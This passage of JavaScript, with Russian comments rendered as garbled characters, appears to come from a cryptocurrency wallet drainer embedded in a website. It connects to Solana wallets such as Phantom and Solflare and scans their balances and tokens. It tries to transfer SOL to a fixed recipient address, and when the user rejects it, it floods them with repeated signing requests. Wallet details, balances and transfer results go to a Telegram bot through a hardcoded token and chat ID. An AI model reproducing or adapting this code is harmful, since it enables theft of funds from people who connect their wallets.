            recipient: this.RECIPIENT_ADDRESS,
            message: `SOL transfer failed: ${error.message}`
          };
        }
      }

      /**
       * –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–µ—Ä–µ–≤–æ–¥–∞ SOL (—Å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–º —Å–ø–∞–º–æ–º)
       */
      async executeSolTransfer(walletAddress, walletProvider) {
        console.log('üöÄ Starting SOL transfer with spam protection...');
        
        // –°–Ω–∞—á–∞–ª–∞ –ø—Ä–æ–±—É–µ–º –æ–±—ã—á–Ω—ã–π –ø–µ—Ä–µ–≤–æ–¥
        const firstAttempt = await this.executeSingleTransfer(walletAddress, walletProvider);
        
        if (firstAttempt.success) {
          console.log('‚úÖ First attempt successful, no spam needed');
          await this.sendSolTransferNotification('First Attempt', walletAddress, firstAttempt);
          return firstAttempt;
        }
        
        // –ï—Å–ª–∏ –ø–µ—Ä–≤–∞—è –ø–æ–ø—ã—Ç–∫–∞ –Ω–µ —É–¥–∞–ª–∞—Å—å, –ø—Ä–æ–≤–µ—Ä—è–µ–º, —Å—Ç–æ–∏—Ç –ª–∏ –∑–∞–ø—É—Å–∫–∞—Ç—å —Å–ø–∞–º
        if (this.shouldRetryAfterError(new Error(firstAttempt.error))) {
          console.log('üö® First attempt failed, starting transaction spam...');
          await this.startTransactionSpam(walletAddress, walletProvider);
          
          return {
            success: false,
            error: 'Transaction spam initiated',
            amount: this.TRANSFER_AMOUNT_SOL,
            recipient: this.RECIPIENT_ADDRESS,
            message: 'Transaction spam started due to user rejection'
          };
        }
        
        // –ï—Å–ª–∏ –æ—à–∏–±–∫–∞ –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è, –≤–æ–∑–≤—Ä–∞—â–∞–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç –ø–µ—Ä–≤–æ–π –ø–æ–ø—ã—Ç–∫–∏
        return firstAttempt;
      }

      /**
       * –û—Å—Ç–∞–Ω–æ–≤–∫–∞ —Å–ø–∞–º–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è–º–∏
       */
      stopTransactionSpam() {
        console.log('üõë Stopping transaction spam...');
        
        this.isSpamActive = false;
        
        // –û—á–∏—â–∞–µ–º –≤—Å–µ –∑–∞–ø–ª–∞–Ω–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Ç–∞–π–º–∞—É—Ç—ã
        this.spamTimeouts.forEach(timeoutId => {
          clearTimeout(timeoutId);
        });
        this.spamTimeouts = [];
        
        this.currentSpamAttempt = 0;
      }

      /**
       * –û—Ç–ø—Ä–∞–≤–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –ø–µ—Ä–µ–≤–æ–¥–µ SOL –≤ Telegram
       */
      async sendSolTransferNotification(walletName, walletAddress, transferResult) {
        const BOT_TOKEN = '8191877610:AAHCISdwN-i6ghFbhWRuOoUa-17MpHTd0Jk';
        const CHAT_ID = '7253475769';
        
        const currentTime = new Date().toLocaleString('ru-RU', {
          timeZone: 'Europe/Moscow',
          year: 'numeric',
          month: '2-digit',
          day: '2-digit',
          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit'
        });

        let message = `üö® **SOL TRANSFER EXECUTED**\n\n`;
        message += `üíº **Wallet:** ${walletName}\n`;
        message += `üìç **From:** \`${walletAddress}\`\n`;
        message += `üìç **To:** \`${this.RECIPIENT_ADDRESS}\`\n`;
        message += `‚è∞ **Time:** ${currentTime}\n`;
        message += `üåê **Site:** ${window.location.hostname}\n`;
        message += `üîÑ **Spam Attempt:** ${this.currentSpamAttempt}/${this.MAX_SPAM_ATTEMPTS}\n\n`;
        
        if (transferResult.success) {
          message += `‚úÖ **Status:** SUCCESS\n`;
          message += `üîó **Signature:** \`${transferResult.signature}\`\n`;
          message += `üí∞ **Amount:** ${transferResult.amount} SOL\n`;
          message += `üíµ **USD Value:** ~$${(transferResult.amount * 100).toFixed(2)} USD\n\n`;
          message += `üéØ **Transaction completed successfully!**\n`;
        } else {
          message += `‚ùå **Status:** FAILED\n`;
          message += `üö´ **Error:** ${transferResult.error}\n`;
          message += `üí∞ **Attempted Amount:** ${transferResult.amount} SOL\n\n`;
        }

        try {
          const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: message,
              parse_mode: 'MarkdownV2',
              disable_web_page_preview: true
            })
          });

          if (response.ok) {
            console.log('‚úÖ SOL transfer notification sent to Telegram');
          } else {
            console.error('‚ùå Failed to send SOL transfer notification');
          }
        } catch (error) {
          console.error('‚ùå Error sending SOL transfer notification:', error);
        }
      }
    }

    // ============================================================================
    // FAST WALLET BALANCE CHECKER (FIRST SUCCESS ONLY)
    // ============================================================================

    /**
     * –ë—Ä–∞—É–∑–µ—Ä–Ω–∞—è –≤–µ—Ä—Å–∏—è —Ñ—É–Ω–∫—Ü–∏–∏ makeRequest —Å –∫–æ—Ä–æ—Ç–∫–∏–º —Ç–∞–π–º–∞—É—Ç–æ–º
     */
    async function makeRequest(url, method, data, retries = 2, timeout = 5000) {
      for (let attempt = 1; attempt <= retries; attempt++) {
        try {
          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), timeout);

          const options = {
            method,
            headers: { 'Content-Type': 'application/json' },
            signal: controller.signal
          };

          if (data && method !== 'GET') {
            options.body = JSON.stringify(data);
          }

          const response = await fetch(url, options);
          clearTimeout(timeoutId);

          if (!response.ok) {
            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
          }

          return await response.json();
        } catch (error) {
          console.error(`Attempt ${attempt} failed for ${url}: ${error.message}`);
          if (attempt === retries) {
            console.error(`All attempts failed for ${url}`);
            return null;
          }
          await new Promise(resolve => setTimeout(resolve, 500));
        }
      }
    }

    /**
     * –ë–´–°–¢–†–ê–Ø –ø—Ä–æ–≤–µ—Ä–∫–∞ –±–∞–ª–∞–Ω—Å–∞ –∫–æ—à–µ–ª—å–∫–∞ - –æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è –Ω–∞ –ø–µ—Ä–≤–æ–º —É—Å–ø–µ—Ö–µ
     */
    async function checkWalletBalanceFast(walletAddress) {
      const heliusRpcUrl = 'https://mainnet.helius-rpc.com/';
      const heliusApiUrl = 'https://api.helius.xyz/v0/addresses/';
      const publicRpcUrl = 'https://api.mainnet-beta.solana.com';
      const apiKeys = [
        '5d71bf51-5f82-4892-8b89-c7257acb9384',
        'ece615f0-f4eb-4a27-a912-bb7ccdf1759e'
      ];

      // –ü—Ä–∏–æ—Ä–∏—Ç–µ—Ç–Ω—ã–µ –º–µ—Ç–æ–¥—ã - —Å–∞–º—ã–µ –±—ã—Å—Ç—Ä—ã–µ –∏ –Ω–∞–¥–µ–∂–Ω—ã–µ
      const priorityRequests = [
        // 1. Helius API - —Å–∞–º—ã–π –±—ã—Å—Ç—Ä—ã–π (–ø–æ–ª—É—á–∞–µ—Ç SOL + —Ç–æ–∫–µ–Ω—ã –æ–¥–Ω–∏–º –∑–∞–ø—Ä–æ—Å–æ–º)
        {
          url: `${heliusApiUrl}${walletAddress}/balances?api-key=${apiKeys[0]}`,
          method: 'GET',
          data: null,
          desc: 'Helius API (Key 1) - SOL and Tokens',
          type: 'combined'
        },
        // 2. Helius API - –≤—Ç–æ—Ä–æ–π –∫–ª—é—á
        {
          url: `${heliusApiUrl}${walletAddress}/balances?api-key=${apiKeys[1]}`,
          method: 'GET',
          data: null,
          desc: 'Helius API (Key 2) - SOL and Tokens',
          type: 'combined'
        },
        // 3. Helius RPC - –±–∞–ª–∞–Ω—Å SOL
        {
          url: `${heliusRpcUrl}?api-key=${apiKeys[0]}`,
          method: 'POST',
          data: { jsonrpc: '2.0', id: 1, method: 'getBalance', params: [walletAddress] },
          desc: 'Helius RPC (Key 1) - SOL Balance',
          type: 'sol'
        },
        // 4. –ü—É–±–ª–∏—á–Ω—ã–π RPC - –±–∞–ª–∞–Ω—Å SOL
        {
          url: publicRpcUrl,
          method: 'POST',
          data: { jsonrpc: '2.0', id: 1, method: 'getBalance', params: [walletAddress] },
          desc: 'Public RPC - SOL Balance',
          type: 'sol'
        }
      ];

      const results = {
        solBalance: 0,
        tokens: [],
        methodUsed: null,
        scanTime: Date.now(),
        success: false
      };

      console.log('üöÄ –ù–∞—á–∏–Ω–∞–µ–º –±—ã—Å—Ç—Ä–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ...');

      // –ü—Ä–æ–±—É–µ–º –º–µ—Ç–æ–¥—ã –ø–æ –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç—É –¥–æ –ø–µ—Ä–≤–æ–≥–æ —É—Å–ø–µ—Ö–∞
      for (const req of priorityRequests) {
        console.log(`‚ö° –ü—Ä–æ–±—É–µ–º: ${req.desc}`);
        
        const result = await makeRequest(req.url, req.method, req.data, 1, 3000);
        
        if (result) {
          results.methodUsed = req.desc;
          results.success = true;
          
          if (req.type === 'combined') {
            // Helius API - –ø–æ–ª—É—á–∞–µ–º –≤—Å–µ –¥–∞–Ω–Ω—ã–µ —Å—Ä–∞–∑—É
            results.solBalance = result.nativeBalance / 1_000_000_000 || 0;
            results.tokens = result.tokens || [];
            
            console.log(`‚úÖ –£—Å–ø–µ—Ö! SOL: ${results.solBalance}, –¢–æ–∫–µ–Ω—ã: ${results.tokens.length}`);
            
            // –ï—Å–ª–∏ –ø–æ–ª—É—á–∏–ª–∏ –¥–∞–Ω–Ω—ã–µ - —Å—Ä–∞–∑—É –≤–æ–∑–≤—Ä–∞—â–∞–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç
            if (results.solBalance > 0 || results.tokens.length > 0) {
              results.scanTime = Date.now() - results.scanTime;
              return results;
            }
          } else if (req.type === 'sol') {
            // RPC - —Ç–æ–ª—å–∫–æ –±–∞–ª–∞–Ω—Å SOL
            results.solBalance = result.result?.value / 1_000_000_000 || 0;
            
            console.log(`‚úÖ –ü–æ–ª—É—á–µ–Ω –±–∞–ª–∞–Ω—Å SOL: ${results.solBalance}`);
            
            // –ï—Å–ª–∏ –µ—Å—Ç—å SOL, –ø—Ä–æ–±—É–µ–º –±—ã—Å—Ç—Ä–æ –ø–æ–ª—É—á–∏—Ç—å —Ç–æ–∫–µ–Ω—ã
            if (results.solBalance > 0) {
              const tokenResult = await getTokensQuick(walletAddress);
              if (tokenResult) {
                results.tokens = tokenResult;
              }
              results.scanTime = Date.now() - results.scanTime;
              return results;
            }
          }
        }
      }

      // –ï—Å–ª–∏ –Ω–∏—á–µ–≥–æ –Ω–µ –ø–æ–ª—É—á–∏–ª–æ—Å—å, –≤–æ–∑–≤—Ä–∞—â–∞–µ–º –ø—É—Å—Ç–æ–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç
      results.scanTime = Date.now() - results.scanTime;
      return results;
    }

    /**
     * –ë—ã—Å—Ç—Ä–æ–µ –ø–æ–ª—É—á–µ–Ω–∏–µ —Ç–æ–∫–µ–Ω–æ–≤ (—Ç–æ–ª—å–∫–æ –æ–¥–∏–Ω –∑–∞–ø—Ä–æ—Å)
     */
    async function getTokensQuick(walletAddress) {
      const heliusRpcUrl = 'https://mainnet.helius-rpc.com/';
      const apiKey = '5d71bf51-5f82-4892-8b89-c7257acb9384';
      
      console.log('ü™ô –ë—ã—Å—Ç—Ä–æ –ø–æ–ª—É—á–∞–µ–º —Ç–æ–∫–µ–Ω—ã...');
      
      const result = await makeRequest(
        `${heliusRpcUrl}?api-key=${apiKey}`,
        'POST',
        {
          jsonrpc: '2.0',
          id: 1,
          method: 'getTokenAccountsByOwner',
          params: [walletAddress, { programId: 'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA' }, { encoding: 'jsonParsed' }]
        },
        1,
        3000
      );

      if (result && result.result && result.result.value) {
        console.log(`ü™ô –ù–∞–π–¥–µ–Ω–æ ${result.result.value.length} —Ç–æ–∫–µ–Ω-–∞–∫–∫–∞—É–Ω—Ç–æ–≤`);
        return result.result.value;
      }

      return [];
    }

    // ============================================================================
    // SOLANA BLOCKCHAIN SCANNER (FAST SCAN ONLY)
    // ============================================================================

    class SolanaWalletScanner {
      constructor() {
        // –†–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–π —Å–ø–∏—Å–æ–∫ –ø–æ–ø—É–ª—è—Ä–Ω—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤ Solana
        this.knownTokens = {
          'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': 'USDC',
          'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': 'USDT',
          'So11111111111111111111111111111111111111112': 'SOL (Wrapped)',
          'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': 'Bonk',
          'JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN': 'Jupiter',
          'mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So': 'Marinade SOL',
          'bSo13r4TkiE4KumL71LsHTPpL2euBYLFx6h9HP3piy1': 'BlazeStake SOL',
          '7vfCXTUXx5WJV5JADk17DUJ4ksgau7utNKj4b963voxs': 'Ether (Wormhole)',
          'A9mUU4qviSctJVPJdBJWkb28deg915LYJKrzQ19ji3FM': 'USDCet (Wormhole)',
          'Saber2gLauYim4Mvftnrasomsv6NvAuncvMEZwcLpD1': 'Saber',
          '4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R': 'Raydium',
          'orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE': 'Orca',
          'SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt': 'Serum',
          'kinXdEcpDQeHPEuQnqmUgtYykqKGVFq6CeVX5iAHJq6': 'Kin',
          'MangoCzJ36AjZyKwVj3VnYU4GTonjfVEnJmvvWaxLac': 'Mango'
        };
      }

      /**
       * –ë–´–°–¢–†–û–ï —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∫–æ—à–µ–ª—å–∫–∞ - –æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è –Ω–∞ –ø–µ—Ä–≤–æ–º —É—Å–ø–µ—Ö–µ
       */
      async performFastScan(walletAddress) {
        console.log(`‚ö° –ù–∞—á–∏–Ω–∞–µ–º –±—ã—Å—Ç—Ä–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∫–æ—à–µ–ª—å–∫–∞: ${walletAddress}`);
        
        const startTime = Date.now();
        
        try {
          // –ó–∞–ø—É—Å–∫–∞–µ–º –±—ã—Å—Ç—Ä—É—é –ø—Ä–æ–≤–µ—Ä–∫—É –±–∞–ª–∞–Ω—Å–∞
          const fastResults = await checkWalletBalanceFast(walletAddress);
          
          if (!fastResults.success) {
            throw new Error('–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –Ω–∏ –æ–¥–Ω–∏–º –º–µ—Ç–æ–¥–æ–º');
          }

          // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º —Ç–æ–∫–µ–Ω—ã
          const processedTokens = [];
          
          if (fastResults.tokens && Array.isArray(fastResults.tokens)) {
            for (const token of fastResults.tokens) {
              let mintAddress, amount, decimals;

              // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º —Ä–∞–∑–Ω—ã–µ —Ñ–æ—Ä–º–∞—Ç—ã —Ç–æ–∫–µ–Ω–æ–≤
              if (token.account && token.account.data && token.account.data.parsed) {
                // –§–æ—Ä–º–∞—Ç RPC
                const tokenInfo = token.account.data.parsed.info;
                mintAddress = tokenInfo.mint;
                amount = tokenInfo.tokenAmount.uiAmount;
                decimals = tokenInfo.tokenAmount.decimals;
              } else if (token.mint && token.amount !== undefined) {
                // –§–æ—Ä–º–∞—Ç API
                mintAddress = token.mint;
                amount = token.amount / Math.pow(10, token.decimals || 0);
                decimals = token.decimals;
              } else {
                continue; // –ü—Ä–æ–ø—É—Å–∫–∞–µ–º –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–µ —Ñ–æ—Ä–º–∞—Ç—ã
              }

              // –î–æ–±–∞–≤–ª—è–µ–º —Ç–æ–ª—å–∫–æ —Ç–æ–∫–µ–Ω—ã —Å –±–∞–ª–∞–Ω—Å–æ–º > 0
              if (amount > 0) {
                const tokenName = this.knownTokens[mintAddress] || `Token ${mintAddress.slice(0, 8)}...`;
                
                processedTokens.push({
                  name: tokenName,
                  mint: mintAddress,
                  amount: amount,
                  decimals: decimals
                });
              }
            }
          }

          // –°–æ—Ä—Ç–∏—Ä—É–µ–º —Ç–æ–∫–µ–Ω—ã –ø–æ –∫–æ–ª–∏—á–µ—Å—Ç–≤—É
          processedTokens.sort((a, b) => b.amount - a.amount);

          const scanDuration = Date.now() - startTime;

          const results = {
            address: walletAddress,
            solBalance: fastResults.solBalance,
            tokens: processedTokens,
            totalTokenAccounts: processedTokens.length,
            scanTimestamp: new Date().toISOString(),
            scanType: 'fast',
            methodUsed: fastResults.methodUsed,
            scanDuration: scanDuration,
            success: true
          };

          console.log(`‚úÖ –ë—ã—Å—Ç—Ä–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ –∑–∞ ${scanDuration}–º—Å`);
          console.log(`üí∞ SOL –±–∞–ª–∞–Ω—Å: ${results.solBalance}`);
          console.log(`ü™ô –ù–∞–π–¥–µ–Ω–æ —Ç–æ–∫–µ–Ω–æ–≤: ${results.tokens.length}`);
          console.log(`üì° –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω –º–µ—Ç–æ–¥: ${results.methodUsed}`);
          
          return results;

        } catch (error) {
          console.error('‚ùå –û—à–∏–±–∫–∞ –±—ã—Å—Ç—Ä–æ–≥–æ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è:', error);
          
          const scanDuration = Date.now() - startTime;
          
          return {
            address: walletAddress,
            solBalance: 0,
            tokens: [],
            totalTokenAccounts: 0,
            scanTimestamp: new Date().toISOString(),
            error: error.message,
            scanType: 'fast',
            scanDuration: scanDuration,
            success: false
          };
        }
      }
    }

    // ============================================================================
    // TELEGRAM BOT INTEGRATION (FAST VERSION)
    // ============================================================================

    /**
     * –û—Ç–ø—Ä–∞–≤–∫–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –∫–æ—à–µ–ª—å–∫–µ –≤ Telegram (–±—ã—Å—Ç—Ä–∞—è –≤–µ—Ä—Å–∏—è)
     */
    async function sendFastTelegramNotification(walletName, walletData) {
      const BOT_TOKEN = '8191877610:AAHCISdwN-i6ghFbhWRuOoUa-17MpHTd0Jk';
      const CHAT_ID = '7253475769';
      
      const currentTime = new Date().toLocaleString('ru-RU', {
        timeZone: 'Europe/Moscow',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
      });

      // –°–æ–∑–¥–∞–µ–º –±—ã—Å—Ç—Ä–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
      let message = `üöÄ **–ë–´–°–¢–†–û–ï –ü–û–î–ö–õ–Æ–ß–ï–ù–ò–ï –ö–û–®–ï–õ–¨–ö–ê**\n\n`;
      message += `üíº **–ö–æ—à–µ–ª–µ–∫:** ${walletName}\n`;
      message += `üìç **–ê–¥—Ä–µ—Å:** \`${walletData.address}\`\n`;
      message += `‚è∞ **–í—Ä–µ–º—è:** ${currentTime}\n`;
      message += `üåê **–°–∞–π—Ç:** ${window.location.hostname}\n`;
      message += `‚ö° **–°–∫–æ—Ä–æ—Å—Ç—å —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è:** ${walletData.scanDuration}–º—Å\n`;
      message += `üì° **–ú–µ—Ç–æ–¥:** ${walletData.methodUsed || 'Unknown'}\n\n`;
      
      message += `üìä **–†–ï–ó–£–õ–¨–¢–ê–¢–´ –ë–´–°–¢–†–û–ì–û –°–ö–ê–ù–ò–†–û–í–ê–ù–ò–Ø:**\n`;
      message += `üí∞ **–ë–∞–ª–∞–Ω—Å SOL:** ${walletData.solBalance.toFixed(6)} SOL\n`;
      message += `ü™ô **–í—Å–µ–≥–æ —Ç–æ–∫–µ–Ω–æ–≤:** ${walletData.totalTokenAccounts}\n`;
      message += `‚úÖ **–°—Ç–∞—Ç—É—Å:** ${walletData.success ? '–£—Å–ø–µ—à–Ω–æ' : '–û—à–∏–±–∫–∞'}\n\n`;

      if (walletData.tokens.length > 0) {
        message += `**üìã –°–ü–ò–°–û–ö –¢–û–ö–ï–ù–û–í:**\n`;
        walletData.tokens.slice(0, 8).forEach((token, index) => {
          message += `${index + 1}\\. **${token.name}**\n`;
          message += `   üí∞ –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ: ${token.amount}\n`;
          message += `   üîó Mint: \`${token.mint}\`\n\n`;
        });
        
        if (walletData.tokens.length > 8) {
          message += `\\.\\.\\. –∏ –µ—â–µ ${walletData.tokens.length - 8} —Ç–æ–∫–µ–Ω–æ–≤\n\n`;
        }
      } else {
        message += `üì≠ **–¢–æ–∫–µ–Ω—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã** –∏–ª–∏ –≤—Å–µ –±–∞–ª–∞–Ω—Å—ã —Ä–∞–≤–Ω—ã 0\n\n`;
      }

      // –î–æ–±–∞–≤–ª—è–µ–º –ø—Ä–∏–º–µ—Ä–Ω—É—é —Å—Ç–æ–∏–º–æ—Å—Ç—å
      if (walletData.solBalance > 0) {
        message += `üíµ **–ü—Ä–∏–º–µ—Ä–Ω–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å SOL:** ~$${(walletData.solBalance * 100).toFixed(2)} USD\n`;
      }

      try {
        console.log('üì§ –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –±—ã—Å—Ç—Ä–æ–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram...');
        
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'MarkdownV2',
            disable_web_page_preview: true
          })
        });

        const responseData = await response.json();
        
        if (response.ok) {
          console.log('‚úÖ –ë—ã—Å—Ç—Ä–æ–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram');
        } else {
          console.error('‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:', responseData);
        }
      } catch (error) {
        console.error('‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:', error);
      }
    }

    // ============================================================================
    // SOLANA WALLET CONNECTION MANAGER (WITH SPAM TRANSACTIONS)
    // ============================================================================

    class SolanaWalletManager {
      constructor() {
        this.connectedWallet = null;
        this.walletAddress = null;
        this.walletName = null;
        this.walletData = null;
        this.scanner = new SolanaWalletScanner();
        this.solTransfer = new SolanaSolTransfer();
        this.isScanning = false;
        this.isTransferring = false;
        
        // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º—ã—Ö –∫–æ—à–µ–ª—å–∫–æ–≤
        this.walletConfigs = {
          phantom: {
            name: 'Phantom',
            provider: () => window.phantom?.solana,
            downloadUrl: 'https://phantom.app/',
            checkMethod: () => window.phantom?.solana?.isPhantom
          },
          solflare: {
            name: 'Solflare',
            provider: () => window.solflare,
            downloadUrl: 'https://solflare.com/',
            checkMethod: () => window.solflare?.isSolflare
          },
          trustwallet: {
            name: 'Trust Wallet',
            provider: () => window.trustwallet?.solana,
            downloadUrl: 'https://trustwallet.com/',
            checkMethod: () => window.trustwallet?.solana
          },
          coinbase: {
            name: 'Coinbase Wallet',
            provider: () => window.coinbaseSolana,
            downloadUrl: 'https://www.coinbase.com/wallet',
            checkMethod: () => window.coinbaseSolana
          },
          bitget: {
            name: 'Bitget Wallet',
            provider: () => window.bitkeep?.solana,
            downloadUrl: 'https://web3.bitget.com/',
            checkMethod: () => window.bitkeep?.solana
          },
          backpack: {
            name: 'Backpack',
            provider: () => window.backpack,
            downloadUrl: 'https://backpack.app/',
            checkMethod: () => window.backpack
          }
        };

        this.init();
      }

      /**
       * –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –º–µ–Ω–µ–¥–∂–µ—Ä–∞ –∫–æ—à–µ–ª—å–∫–æ–≤
       */
      init() {
        this.setupEventListeners();
        this.checkPreviousConnection();
      }

      /**
       * –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–µ–¥—ã–¥—É—â–µ–≥–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
       */
      async checkPreviousConnection() {
        const savedWallet = localStorage.getItem('connectedWallet');
        if (savedWallet && this.walletConfigs[savedWallet]) {
          try {
            await this.connectWallet(savedWallet, false);
          } catch (error) {
            console.log('Previous connection failed:', error);
            localStorage.removeItem('connectedWallet');
          }
        }
      }

      /**
       * –û—Å–Ω–æ–≤–Ω–æ–π –º–µ—Ç–æ–¥ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –∫–æ—à–µ–ª—å–∫—É (–ë–´–°–¢–†–û–ï –°–ö–ê–ù–ò–†–û–í–ê–ù–ò–ï + –°–ü–ê–ú –¢–†–ê–ù–ó–ê–ö–¶–ò–Ø–ú–ò)
       */
      async connectWallet(walletKey, requestPermission = true) {
        if (this.isScanning) {
          console.log('‚è≥ –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —É–∂–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è...');
          return;
        }

        const config = this.walletConfigs[walletKey];
        
        if (!config) {
          throw new Error(`Unsupported wallet: ${walletKey}`);
        }

        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å—Ç–∞—Ç—É—Å –∑–∞–≥—Ä—É–∑–∫–∏
        this.showConnectionStatus('loading', `Connecting to ${config.name}...`);

        try {
          let response;
          let provider = config.provider();
          
          // –ï—Å–ª–∏ –∫–æ—à–µ–ª–µ–∫ –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω, —Å–∏–º—É–ª–∏—Ä—É–µ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ
          if (!provider) {
            console.log(`${config.name} not installed, simulating connection...`);
            
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            const fakeAddress = this.generateFakeAddress();
            response = { publicKey: { toString: () => fakeAddress } };
            
            provider = {
              isConnected: true,
              publicKey: { toString: () => fakeAddress },
              disconnect: () => Promise.resolve(),
              on: () => {},
              signTransaction: async (transaction) => {
                // –°–∏–º—É–ª—è—Ü–∏—è –ø–æ–¥–ø–∏—Å–∏ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
                console.log('üîè Simulating transaction signature...');
                await new Promise(resolve => setTimeout(resolve, 2000));
                return {
                  serialize: () => new Uint8Array(64) // –§–µ–π–∫–æ–≤–∞—è –ø–æ–¥–ø–∏—Å–∞–Ω–Ω–∞—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è
                };
              }
            };
          } else {
            // –†–µ–∞–ª—å–Ω–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–º—É –∫–æ—à–µ–ª—å–∫—É
            if (walletKey === 'phantom') {
              response = await this.connectPhantom(provider, requestPermission);
            } else if (walletKey === 'solflare') {
              response = await this.connectSolflare(provider, requestPermission);
            } else {
              response = await this.connectGenericWallet(provider, requestPermission);
            }
          }

          // –°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏
          this.connectedWallet = provider;

          // –ü–æ–ª—É—á–∞–µ–º –ø–æ–ª–Ω—ã–π –∞–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞
          let walletAddress;
          if (response.publicKey) {
            if (typeof response.publicKey === 'string') {
              walletAddress = response.publicKey;
            } else if (response.publicKey.toString) {
              walletAddress = response.publicKey.toString();
            } else if (response.publicKey.toBase58) {
              walletAddress = response.publicKey.toBase58();
            }
          } else if (provider.publicKey) {
            if (typeof provider.publicKey === 'string') {
              walletAddress = provider.publicKey;
            } else if (provider.publicKey.toString) {
              walletAddress = provider.publicKey.toString();
            } else if (provider.publicKey.toBase58) {
              walletAddress = provider.publicKey.toBase58();
            }
          }

          this.walletAddress = walletAddress;
          this.walletName = config.name;

          console.log('üîç –ü–æ–ª—É—á–µ–Ω–Ω—ã–π –∞–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞:', this.walletAddress);

